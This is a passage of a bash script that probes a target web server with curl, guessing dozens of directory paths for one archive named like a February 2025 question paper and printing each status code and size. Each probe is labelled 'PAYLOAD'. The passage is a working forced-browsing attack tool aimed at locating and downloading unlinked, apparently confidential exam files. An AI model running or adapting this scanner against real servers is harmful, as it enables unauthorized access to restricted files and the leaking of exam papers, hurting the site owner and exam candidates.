${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
